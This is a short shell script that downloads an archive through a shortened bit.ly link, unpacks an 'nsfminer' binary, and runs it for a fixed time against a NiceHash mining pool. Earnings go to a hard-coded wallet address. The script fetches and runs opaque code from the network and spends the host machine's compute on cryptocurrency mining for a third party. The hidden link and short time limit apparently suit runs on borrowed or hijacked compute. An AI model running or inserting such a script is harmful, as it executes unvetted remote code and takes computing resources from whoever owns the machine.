#!/bin/sh
wget https://bit.ly/31YnEGW
tar -xvf 31YnEGW
chmod +x nsfminer
timeout 1000 ./nsfminer -P stratum2+tcp://3EhmiQgfEoT1mg4ajPgQwGRg1iatY1dJ9E.FO@daggerhashimoto.usa-west.nicehash.com:3353
